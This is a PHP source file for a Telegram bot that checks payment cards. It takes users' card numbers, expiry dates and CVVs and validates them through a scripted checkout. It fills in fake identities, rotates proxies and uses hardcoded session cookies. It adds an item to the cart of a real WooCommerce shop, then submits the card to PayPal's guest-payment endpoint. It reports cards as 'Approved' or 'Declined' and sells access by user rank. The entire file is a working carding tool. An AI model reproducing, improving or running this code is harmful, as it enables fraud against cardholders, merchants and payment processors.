<?php


$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}


if((strpos($text, '/pp') === 0) or (strpos($text, '.pp') === 0) or ((strpos($text, '$pp') === 0) or (strpos($text, '!pp') === 0)) or ((strpos($text, '+pp') === 0) or (strpos($text, '#pp') === 0)) or (strpos($text, '?pp') === 0)) {


$userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}


if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Paypal</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}  

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}
  
$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (!preg_match($pattern, $paidData, $matches) && !in_array($chatId, $owners)) {

if (!in_array($chatId, $authgrps)) {
      
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Not Allowed Here!⚠️</code>
[↯]Message: <code>Contact the Owner to authorize</code>
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
    }
}

$spamWaitTime = isSpamming($userId);
if ($spamWaitTime !== false) {
bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamWaitTime seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
}  




  
$start_time = microtime(true);

$messageidtoedit44 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtopp = capture(json_encode($messageidtoedit44), '"message_id":', ',');
        

$lista = substr($message, 4);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


$last4 = substr($cc, -4);

//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopp,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',
            
        ]);
return;
}

//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopp,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

   //=========MAIN CODE=========//     
        
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function get_str($string, $start, $end) {
  return explode($end, explode($start, $string)[1])[0];
}


function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();



function generateReferenceId() {
    $prefix = '0';
    $uuid = bin2hex(random_bytes(16));
    $referenceId = $prefix . '_' . substr($uuid, 0, 8) . '-' . substr($uuid, 8, 4) . '-' . substr($uuid, 12, 4) . '-' . substr($uuid, 16, 4) . '-' . substr($uuid, 20, 12);
    return $referenceId;
}
$referid = generateReferenceId();




function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$last4 = substr($cc, -4);


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}


function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopp,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//==================[BIN LOOK-UP]======================//
$fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
$bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];
        
        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
    }
//==================[BIN LOOK-UP-END]======================//

 bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopp,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://reggaefy.com/product/jamaica-independence-map-glossy-mug/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: reggaefy.com';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: multipart/form-data; boundary=----'.$web.'';
$headers[] = 'Cookie: wp_woocommerce_session_d295772223e0df63d2f0294abeba606c=t_40f224e37082c64ac14d3a6fc0aed6%7C%7C1694869723%7C%7C1694866123%7C%7C57e81c82803049aacdda88cfa600b35a; woocommerce_items_in_cart=1; woocommerce_cart_hash=7b21db4f083aa2e06aa365754eb06fde';
$headers[] = 'Path: /product/jamaica-independence-map-glossy-mug';
$headers[] = 'Referer: https://reggaefy.com/product/jamaica-independence-map-glossy-mug/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------'.$web.'
Content-Disposition: form-data; name="attribute_pa_size"

11oz
------'.$web.'
Content-Disposition: form-data; name="quantity"

1
------'.$web.'
Content-Disposition: form-data; name="add-to-cart"

5491
------'.$web.'
Content-Disposition: form-data; name="product_id"

5491
------'.$web.'
Content-Disposition: form-data; name="variation_id"

5492
------'.$web.'--
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://reggaefy.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: reggaefy.com';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Path: /checkout/';
$headers[] = 'Cookie: wp_woocommerce_session_d295772223e0df63d2f0294abeba606c=t_40f224e37082c64ac14d3a6fc0aed6%7C%7C1694869723%7C%7C1694866123%7C%7C57e81c82803049aacdda88cfa600b35a; woocommerce_items_in_cart=1; woocommerce_cart_hash=409bf7f196602f6505f59416376fad5a';
$headers[] = 'Referer: https://reggaefy.com/cart/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result3 = curl_exec($ch);
$bnonce = trim(strip_tags(getstr($result3, '"nonce":"','"')));
echo "Nonce : " . $bnonce;


$wnonce = '/name="woocommerce-process-checkout-nonce" value="([^"]+)"/';
if (preg_match($wnonce, $result3, $matches)) {
    $nonce_value = $matches[1];
    //echo "Nonce value: " . $nonce_value;
} else {
    //echo "Nonce value not found.";
}

//=================REQ 4===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://reggaefy.com/?wc-ajax=ppc-create-order');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: reggaefy.com';
$headers[] = 'path: /?wc-ajax=ppc-create-order';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.6';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: wp_woocommerce_session_d295772223e0df63d2f0294abeba606c=t_40f224e37082c64ac14d3a6fc0aed6%7C%7C1694869723%7C%7C1694866123%7C%7C57e81c82803049aacdda88cfa600b35a; woocommerce_items_in_cart=1; woocommerce_cart_hash=409bf7f196602f6505f59416376fad5a';
$headers[] = 'origin: https://reggaefy.com';
$headers[] = 'referer: https://reggaefy.com/checkout/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"nonce":"e414bf60a1","payer":null,"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-card-button-gateway","funding_source":"card","form_encoded":"billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=&billing_country=US&billing_address_1=5th+Ave&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone='.$phone.'&billing_email='.$email.'&account_password='.$pass.'&shipping_first_name='.$name.'&shipping_last_name='.$last.'&shipping_company=&shipping_country=US&shipping_address_1=5th+Ave&shipping_address_2=&shipping_city=New+York&shipping_state=NY&shipping_postcode=10080&order_comments=&shipping_method%5B0%5D=printful_shipping_STANDARD&payment_method=ppcp-card-button-gateway&woocommerce-process-checkout-nonce='.$nonce_value.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false}
');
 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result4 = curl_exec($ch);
$idd = trim(strip_tags(getStr($result4,'{"success":true,"data":{"id":"','"}}')));

//echo "OrderId: $idd";

//=======================[5 REQ]==================================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopp,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: www.paypal.com';
$headers[] = 'path: /graphql?fetch_credit_form_submit';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: enforce_policy=ccpa; LANG=en_US%3BUS; nsid=s%3Ar_lg64Amg1cBjpKGWeda3VERL36CpsnD.BVPuQ2xSzoTxQydnJF0sFuPP98jWPMUreRfLZpW8Md0; ts_c=vr%3D9cc99c7518a0ad04b5790cb2ffea5e57%26vt%3D9cc99c7518a0ad04b5790cb2ffea5e56; l7_az=dcg14.slc; KHcl0EuY7AKSMgfvHl7J5E7hPtK=rJ5DNxa85lGth6ocXpaQiv2GNB4xkG21wRXKgtezyyeWlUg7vIjCW9_nheDa1HEq7j9OPU01RC_KvdAA; tsrce=checkoutjs; x-pp-s=eyJ0IjoiMTY5NDg0NzkwNjcwNyIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1789542306%26vteXpYrS%3D1694849706%26vr%3D9cc99c7518a0ad04b5790cb2ffea5e57%26vt%3D9cc99c7518a0ad04b5790cb2ffea5e56%26vtyp%3Dnew';
$headers[] = 'x-country: US';
$headers[] = 'x-app-name: standardcardfields';
$headers[] = 'paypal-client-context: 53J56810ST000305H';
$headers[] = 'paypal-client-metadata-id: 53J56810ST000305H';
$headers[] = 'origin: https://www.paypal.com';
$headers[] = 'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_57f449ede6_mdy6ntu6ntg&buttonSessionID=uid_7059a2c7ad_mdy6nty6ndm&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRJamRFOVJadEtadTFELVFyQ1B4U0tZZHpGb2x6bUo4UnRDdV9mMkFwemwyN0Q3Qjlic3NyMWgyYndGQ1llZVl6aV9XX0RWLXVqdmdVUlcmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyMy0wOC0xMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfZWlnY29taWVjd214aGJma2dzaXpqYnB3YWVlanpzIn19&disable-card=&token=53J56810ST000305H';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"3UW491798V2549001","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"'.$postcode.'","securityCode":"'.$cvv.'"},"firstName":"'.$name.'","lastName":"'.$last.'","billingAddress":{"givenName":"'.$name.'","familyName":"'.$last.'","line1":"5th+Ave","line2":null,"city":"New+York","state":"NY","postalCode":"10080","country":"US"},"email":"'.$email.'","currencyConversionType":"VENDOR"},"operationName":null}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result5 = curl_exec($ch);

$msg = trim(strip_tags(getstr($result5, '"message":"','"')));
$dcode = trim(strip_tags(getstr($result5, '"code":"','"')));

//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopp,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//=============CHECKER PART END============//

if(strpos($result5, "Thank you.")) {

$status = ("Approved ✅");  
$respo = ("Approved");
}

elseif(strpos($result5, "INVALID_SECURITY_CODE")) {
$status = ("Approved ✅");  
$respo = ("INVALID_SECURITY_CODE");
}
elseif(strpos($result5, "EXISTING_ACCOUNT_RESTRICTED")) {
$status = ("Approved ✅");  
$respo = ("EXISTING_ACCOUNT_RESTRICTED");
}
elseif(strpos($result5, "INVALID_BILLING_ADDRESS")) {
$status = ("Approved ✅");  
$respo = ("INVALID_BILLING_ADDRESS");
}

  

else {
$status = ("Declined ❌");  
$respo = ("$msg");
}


$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//
bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtopp,
'text'=>"<b>
Paypal 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: $status
[ϟ]Result: $dcode
[ϟ]Code: $respo

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]T: <code>$time SEC</code> | P: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
recordBotResponseTimestamp($userId);
}else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopp,
            'text'=>"<b>Provide a Valid CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
        ]);

        }
    

    